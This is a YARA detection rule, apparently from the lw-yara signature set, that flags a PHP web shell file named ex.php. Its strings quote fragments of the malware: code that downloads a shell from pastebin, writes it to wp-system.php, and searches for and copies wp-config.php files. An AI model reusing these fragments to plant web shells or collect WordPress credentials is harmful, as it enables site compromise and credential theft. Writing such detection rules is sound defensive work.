rule infected_12_22_19_shell1_work1_ex {
  meta:
    description = "work1 - file ex.php"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara/"
    date        = "2019-12-22"
    hash1       = "11cc1ce74623cca92b70a0992dfe908126e4a9a82243db110ea0f810ad474d82"

  strings:
    $x1  = "$shell = file_get_contents('https://pastebin.com/raw/hpqEekGT'); //" fullword ascii
    $s2  = "$base = file_get_contents('https://pastebin.com/raw/kHL0XPea');" fullword ascii
    $s3  = "file_put_contents('wp-system.php',$shell);  //" fullword ascii
    $s4  = "$user = posix_getpwuid(posix_getuid());" fullword ascii
    $s5  = "$result=fopen('result.txt','w');" fullword ascii
    $s6  = "copy($file,($i+1).'.txt');" fullword ascii
    $s7  = "$find = 'wp-config.php';" fullword ascii
    $s8  = "$new='wp-system.php';" fullword ascii
    $s9  = "$result = findFilesFromDirectory($finalPath, $files, $find);" fullword ascii
    $s10 = "function findFilesFromDirectory($path, &$files, $find) {" fullword ascii

  condition:
    (uint16(0) == 0x3f3c and
      filesize < 3KB and
      (1 of ($x*) and all of them)
    ) or (all of them)
}